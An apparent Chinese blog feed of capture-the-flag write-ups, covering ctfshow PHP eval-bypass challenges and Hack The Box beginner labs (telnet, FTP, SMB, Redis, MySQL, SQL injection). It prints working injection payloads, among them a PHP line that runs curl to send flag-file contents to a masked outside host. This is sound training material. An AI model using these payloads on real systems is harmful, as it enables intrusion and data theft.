class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-04 14:28:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;(<span class="subst">$ctfshow</span>)();&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo^phpinfo^phpinfo</span><br></pre></td></tr></table></figure><p>这里就是p和p异或，依次来异或</p><p><strong>异或 </strong>     ——-&gt;    相同为零   不同为1 </p><p>拿<code>p^p^p</code>来举个例子     先是 <code>p^p</code>  —-&gt;  0      然后 <code>0^p</code>  ———-&gt;   p</p><p>就是这样了</p><h2 id="web451"><a href="#web451" class="headerlink" title="web451"></a>web451</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-04 15:38:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z]+[\^][a-z]+[\^][a-z]+$/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/phpinfo/&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;(<span class="subst">$ctfshow</span>)();&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpanfo^phpznfo^phprnfo</span><br></pre></td></tr></table></figure><p><strong>这里的异或是转化为ascii码来进行计算的</strong></p><h2 id="web452"><a href="#web452" class="headerlink" title="web452"></a>web452</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-03 22:57:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-04 16:05:23</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|\&quot;|[0-9]|\&#123;|\[|\~|\^|phpinfo|\$/i&#x27;</span>, <span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=<span class="keyword">echo</span> `cat /f*`;</span><br></pre></td></tr></table></figure><h2 id="web453"><a href="#web453" class="headerlink" title="web453"></a>web453</h2><p><strong>题目</strong></p><p><img src="../images/image-20230405221320480.png" alt="image-20230405221320480"></p><p>先去读取一下源码</p><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-02-04 22:43:04</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-02-05 02:03:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span> = <span class="keyword">new</span> <span class="title class_">Swoole\Http\Server</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;start&#x27;</span>, function (<span class="variable">$server</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Swoole http server is started at http://0.0.0.0:80\n&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">on</span>(<span class="string">&#x27;request&#x27;</span>, function (<span class="variable">$request</span>, <span class="variable">$response</span>) &#123;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$controller</span>, <span class="variable">$action</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$request</span>-&gt;server[<span class="string">&#x27;request_uri&#x27;</span>], <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">    <span class="variable">$route</span> = <span class="keyword">array</span>(<span class="string">&#x27;ctf&#x27;</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="keyword">array</span>(<span class="string">&#x27;show&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$controller</span>, <span class="variable">$route</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$method</span>))&#123;</span><br><span class="line">    (<span class="keyword">new</span> <span class="variable">$controller</span>)-&gt;<span class="variable">$action</span>(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;&lt;h3&gt;where is flag?&lt;/h3&gt;&lt;!--/ctf/show?s=XXX  file_get_contents($_POST[\&#x27;s\&#x27;])--&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable">$http</span>-&gt;<span class="title function_ invoke__">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$s</span>));</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"> <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line"> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;file write done in /var/www/shell.php&#x27;</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;php shell.php&#x27;</span>);</span><br><span class="line"><span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;command exec done&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也就是说，当我们访问/ctf/file post传入的s会写入shell.php中，然后当我们访问/ctf/exec时，就会去执行刚才的shell.php。<br>里面的内容大家就可以随意发挥了。<br>我写的是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://xxx.xxx.xxx:4567?p=`cat f*`&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>剩下的题就不做了</p><p>去看yu师傅和Y4师傅的博客就好了</p><p><a href="https://blog.csdn.net/solitudi/article/details/113778651">Y4wp </a>    <a href="https://blog.csdn.net/miuzzx/article/details/112692697?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=ctfshow%20web396&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-4-112692697.nonecase&amp;spm=1018.2226.3001.4187">yu2xxwp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web396&quot;&gt;&lt;a href=&quot;#web396&quot; class=&quot;headerlink&quot; title=&quot;web396&quot;&gt;&lt;/a&gt;web396&lt;/h2&gt;&lt;p&gt;题目&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl</summary>
      
    
    
    
    
    <category term="ctfshow 其他 刷题记录" scheme="https://ke1nys.github.io/tags/ctfshow-%E5%85%B6%E4%BB%96-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>htb-starting point</title>
    <link href="https://ke1nys.github.io/posts/41d43cf2.html"/>
    <id>https://ke1nys.github.io/posts/41d43cf2.html</id>
    <published>2023-03-29T07:21:55.000Z</published>
    <updated>2023-04-09T11:08:11.666Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Meow-telnet"><a href="#Meow-telnet" class="headerlink" title="Meow(telnet)"></a>Meow(telnet)</h2><p><img src="../images/image-20230329161813096.png" alt="image-20230329161813096"></p><p><img src="../images/image-20230329152247821.png" alt="image-20230329152247821"></p><p>怎么先完成vpn的配置，记得上面的<strong>vpn数字</strong>要选一样的，不然ping不通，</p><p>还有一点就是先关闭靶机在关闭vpn，不然的话得等好几个小时才能重新连接vpn</p><p>先ping一下，看一下靶机是否存活</p><p><img src="../images/image-20230329152446543.png" alt="image-20230329152446543"></p><p>有返回了，代表存活</p><p>然后扫一下端口</p><p><img src="../images/image-20230329152518368.png" alt="image-20230329152518368"></p><p>发现23端口是打开的，并且是telnet服务的</p><p>因为telnet是远程登录服务器服务，尝试用这个服务区登录一下</p><p><strong>telnet xxxxxxxx</strong></p><p><img src="../images/image-20230329152843423.png" alt="image-20230329152843423"></p><p><img src="../images/image-20230329152903431.png" alt="image-20230329152903431"></p><p>最后猜的root用户，然后登录成功</p><p>拿到flag</p><h2 id="Fawn-ftp"><a href="#Fawn-ftp" class="headerlink" title="Fawn(ftp)"></a>Fawn(ftp)</h2><p><img src="../images/image-20230329161804441.png" alt="image-20230329161804441"></p><p><img src="../images/image-20230329153208092.png" alt="image-20230329153208092"></p><p>可以ping通，说明主机存活</p><p>然后进行nmap扫描</p><p>-sV 探测服务/版本信息 我们可以看到 开放21端口的ftp协议 版本是 vsftpd 3.0.3</p><p><img src="../images/image-20230329153834657.png" alt="image-20230329153834657"></p><p>目标上运行的操作系统类型是Unix</p><p><strong>对ftp进行补充一下</strong></p><p>FTP没有账户时候我们的username: anonymous 采用匿名访问;</p><p>对于FTP我们每次操作服务器都会给我们回应状态码 不同状态码对应不同的的含义：</p><p><img src="../images/image-20230329154248434.png" alt="image-20230329154248434"></p><p>比如用户登录成功 服务器就会返回230状态码;</p><p>在这个ftp服务器上是不能直接cat读取文件的，我们得进行get外带</p><p>下载文件</p><p>下载文件通常用get和mget这两条命令。 a) get 格式：get [remote-file] [local-file] 将文件从远端主机中传送至本地主机中。 如要获取远程服</p><p><code>ftp&gt; get /usr/your/1.htm 1.htm (回车)</code></p><p>b) mget　　　　　　 格式：mget [remote-files] 从远端主机接收一批文件至本地主机。 如要获取服务器上/usr/your/下的所有文件，则</p><p><code>ftp&gt; cd /usr/your/ ftp&gt; mget *.* (回车)</code></p><p>先用ftp 连接 服务器 采用匿名登录 无密码 查询服务器 文件 发现flag 进行下载 然后本地读取</p><p><img src="../images/image-20230329154621851.png" alt="image-20230329154621851"></p><p>匿名访问，没有密码</p><p><img src="../images/image-20230329154739182.png" alt="image-20230329154739182"></p><p>然后就可以本地当前目录下查看flag了</p><p><img src="../images/image-20230329154822624.png" alt="image-20230329154822624"></p><p>通关</p><h2 id="Dancing-SMB"><a href="#Dancing-SMB" class="headerlink" title="Dancing(SMB)"></a>Dancing(SMB)</h2><p><img src="../images/image-20230329161824778.png" alt="image-20230329161824778"></p><p>还是先ping下</p><p><img src="../images/image-20230329155320103.png" alt="image-20230329155320103"></p><p>可以ping通，说明主机存活</p><p>SMB(全称是Server Message Block)是一个网络<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlOEQlOEYlRTglQUUlQUUvMTMwMjAyNjk/ZnJvbU1vZHVsZT1sZW1tYV9pbmxpbms=">协议</a>名，它能被用于<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9XZWIvMTUwNTY0P2Zyb21Nb2R1bGU9bGVtbWFfaW5saW5r">Web</a>连接和<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQUUlQTIlRTYlODglQjclRTclQUIlQUYvMTAxMDgxP2Zyb21Nb2R1bGU9bGVtbWFfaW5saW5r">客户端</a>与服务器之间的<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTQlQkYlQTElRTYlODElQUYlRTYlQjIlOUYlRTklODAlOUEvMTA1MzAxMj9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==">信息沟通</a>。SMB最初是IBM的贝瑞·费根鲍姆（Barry Feigenbaum）研制的，其目的是将<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9ET1MlRTYlOTMlOEQlRTQlQkQlOUMlRTclQjMlQkIlRTclQkIlOUYvNjE4NjAwMz9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==">DOS操作系统</a>中的本地文件接口“中断13”改造为<a href="https://www.yanyang.ink/?golink=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclQkQlOTElRTclQkIlOUMlRTYlOTYlODclRTQlQkIlQjYlRTclQjMlQkIlRTclQkIlOUYvOTcxOTQyMD9mcm9tTW9kdWxlPWxlbW1hX2lubGluaw==">网络文件系统</a>。<br>简而言之就是个传输文件 文件共享用的协议 跟FTP差不了太多。</p><p><img src="../images/image-20230329160924545.png" alt="image-20230329160924545"></p><p>使用nmap扫一下，发现开了三个端口</p><p>135: <strong>msrpc</strong> <strong>（MicroSoft Remote Procedure Call，微软远程过程调用）</strong> 这是windows系统特有的服务<br>139:<strong>netbios-ssn</strong> 用于提供文件共享服务,主要用于企业内部网之间互相访问 也是微软的服务<br>445:就是我们说的<strong>SMB</strong><br>尝试连接SMB 密码为空 连接成功：</p><p><img src="../images/image-20230329161145722.png" alt="image-20230329161145722"></p><p>可以看到有WorkShares 的目录 可以访问 ，进行访问<br>smbclient //10.129.71.90/WorkShares<br>找了一下flag.txt 发现 没有 于是进入别的目录找 在James.P下找到</p><p><img src="../images/image-20230329161314793.png" alt="image-20230329161314793"></p><p><img src="../images/image-20230329161347826.png" alt="image-20230329161347826"></p><p>通关</p><h2 id="Redeemer-Redis"><a href="#Redeemer-Redis" class="headerlink" title="Redeemer(Redis)"></a>Redeemer(Redis)</h2><p><img src="../images/image-20230329161840375.png" alt="image-20230329161840375"></p><p><strong>Redis</strong>是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。redis的默认端口号是6379。</p><p><strong>还是先ping一下</strong></p><p><img src="../images/image-20230329162205909.png" alt="image-20230329162205909"></p><p>接下来扫一下默认端口</p><p>前面没扫到是因为nmap默认的端口好是1-1000</p><p><img src="../images/image-20230329162326905.png" alt="image-20230329162326905"></p><p><img src="../images/image-20230329162446458.png" alt="image-20230329162446458"></p><p>扫到redis版本了</p><p><strong>通过redis-cli尝试连接</strong></p><p><img src="../images/image-20230329162733702.png" alt="image-20230329162733702"></p><p>连接成功，通过输入 <strong>info</strong> 查看redis服务信息与状态，发现数据库名与Key个数，通过查看数据库内容发现<strong>flag</strong></p><p><img src="../images/image-20230329162841616.png" alt="image-20230329162841616"></p><p><img src="../images/image-20230329162921188.png" alt="image-20230329162921188"></p><p>通关</p><p>(vip的题做不了)  ——&gt;  只能去做 下一个板块免费的题了</p><h2 id="Appointment-sql注入"><a href="#Appointment-sql注入" class="headerlink" title="Appointment(sql注入)"></a>Appointment(sql注入)</h2><p><img src="../images/image-20230329164816236.png" alt="image-20230329164816236"></p><p>先ping一下</p><p><img src="../images/image-20230329164831717.png" alt="image-20230329164831717"></p><p>ping通了</p><p>这题得开kali的图形化界面了，因为这里考察的点是sql注入</p><p>这里连接openvpn的时候，machine要连接udp,start-point要连接tcp</p><p>不然的话靶机用不了</p><p>扫一下端口</p><p><img src="../images/image-20230330143929462.png" alt="image-20230330143929462"></p><p>发现80默认端口打开，<img src="../images/image-20230330144058574.png" alt="image-20230330144058574"></p><p>然后尝试一下弱密码，发现不行后在尝试一下万能密码注入试试</p><p><img src="../images/image-20230330144149273.png" alt="image-20230330144149273"></p><p>万能密码注入成功</p><p>通关</p><h2 id="Sequel-mysql"><a href="#Sequel-mysql" class="headerlink" title="Sequel(mysql)"></a>Sequel(mysql)</h2><p>考点</p><p><img src="../images/image-20230330145212076.png" alt="image-20230330145212076"></p><p>还是先ping一下</p><p><img src="../images/image-20230330145240338.png" alt="image-20230330145240338"></p><p>能通，扫一下端口号</p><p><img src="../images/image-20230330145921057.png" alt="image-20230330145921057"></p><p>扫完了，发现开了个3306端口，是mysql的默认端口号</p><p>然后我们尝试连接一下数据库(没安装mysql的自己手动安装一下)</p><p><img src="../images/image-20230330150224251.png" alt="image-20230330150224251"></p><p>这里的密码为空就不填了(root用户(就是用户名)允许无密码登录)</p><p><img src="../images/image-20230330150343364.png" alt="image-20230330150343364"></p><p>连接成功</p><p>接下来就是利用sql语句来查询了</p><p><img src="../images/image-20230330150501495.png" alt="image-20230330150501495"></p><p>最后拿到flag</p><p>通关</p><h2 id="Crocodile-ftp和web网页"><a href="#Crocodile-ftp和web网页" class="headerlink" title="Crocodile(ftp和web网页)"></a>Crocodile(ftp和web网页)</h2><p><img src="../images/image-20230330150804673.png" alt="image-20230330150804673"></p><p>还是先ping一下</p><p><img src="../images/image-20230330150834777.png" alt="image-20230330150834777"></p><p>接下来扫一下端口</p><p><img src="../images/image-20230330151245444.png" alt="image-20230330151245444"></p><p>扫出来老朋友ftp了，还有这个80端口的web网页，那我们还是先去看一下这个ftp</p><p><img src="../images/image-20230330151515067.png" alt="image-20230330151515067"></p><p><img src="../images/image-20230330151620224.png" alt="image-20230330151620224"></p><p>直接把ftp服务器上的账号密码全给提取到本地了</p><p><img src="../images/image-20230330152635235.png" alt="image-20230330152635235"></p><p>访问网站看到这玩意(打开真慢)</p><p>然后利用<code>gobuster</code>扫一下网站</p><p>gobuster dir -u <a href="http://10.129.98.232">http://10.129.98.232</a> -w /usr/share/wordlists/dirb/common.txt</p><p>dir  —-&gt; 是扫目录</p><p>dns  —-&gt;爆破dns</p><p>vHost  —-&gt; 扫子域</p><p><img src="../images/image-20230330152958204.png" alt="image-20230330152958204"></p><p>发现存在301重定向(302也是)，然后去访问一下</p><p>在访问到<a href="http://10.129.98.232/dashboard/的时候，跳转到了">http://10.129.98.232/dashboard/的时候，跳转到了</a></p><p><img src="../images/image-20230330153223984.png" alt="image-20230330153223984"></p><p>然后我们就拿之前在ftp服务器获取的账号密码进行登录</p><p><img src="../images/image-20230330153317372.png" alt="image-20230330153317372"></p><p>通关</p><h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder()"></a>Responder()</h2><p>考点</p><p><img src="../images/image-20230330154052951.png" alt="image-20230330154052951"></p><p>考点挺多的啊</p><p>老样子还是能ping通</p><p><img src="../images/image-20230403154945808.png" alt="image-20230403154945808"></p><p>但是就是端口扫描太慢了</p><p>这里就拿一下别人扫出的端口号</p><p>nmap的一些指令的用法</p><p>借用一下，-sS 使用 SYN 扫描，因为 TCP 扫描会经历三次握手耗费大量时间，-Pn 是禁 ping 主机，防止被防火墙过滤而漏扫，但是我们只有一个主机，所以没什么影响，-n 不解析域名，-open 只输出开放端口，结果扫描到 3 个端口，而且注意 5985 端口扫描出的服务也有所不同</p><p><img src="../images/image-20230403160224371.png" alt="image-20230403160224371"></p><p><strong>这个 wsman 全称是 Windows Remote Managemen(WS_Management) ,如果使用 Win7 或者Windows 2003 Server以上版本的操作系统，微软在系统中已经自带了支持WSMAN 的管理客户端，叫做 winrm，它可以提供远程 powershell 管理服务，听起来就比较危险</strong></p><p>扫到了这几个端口号，但是去访问<strong>80</strong>的时候却报错，然后重定向到了另一个域名处</p><p><img src="../images/image-20230403160317545.png" alt="image-20230403160317545"></p><p>5985端口也是一样(但是没有重定向)</p><p><img src="../images/image-20230403160622798.png" alt="image-20230403160622798"></p><p>7680端口也是这样，没有重定向</p><p><img src="../images/image-20230403160558935.png" alt=""></p><p>我们知道如果想通过域名访问一个网站的话，是需要进行 dns 解析的，我们直接输入 IP 地址发现被重定向到了 <code>unika.htb</code> 这个域名，但是这个域名没有办法解析到对应的 IP 地址，所以我们需要通过修改 <code>hosts</code> 文件来确定 IP 地址</p><p><strong>修改host进入网址</strong></p><p><img src="../images/image-20230403161118887.png" alt="image-20230403161118887"></p><p>添加后，就可以成功进入网址了</p><p><img src="../images/image-20230403161144380.png" alt="image-20230403161144380"></p><p>再次访问，出现页面，这个网站是通过虚拟主机搭建的，也就是多个网站搭建在一台服务器上，一般现实环境中是不能通过虚拟主机的 IP 直接访问的，而是通过 <code>A 记录</code>(把域名解析到一个IP地址)或 <code>CNAME 记录</code> 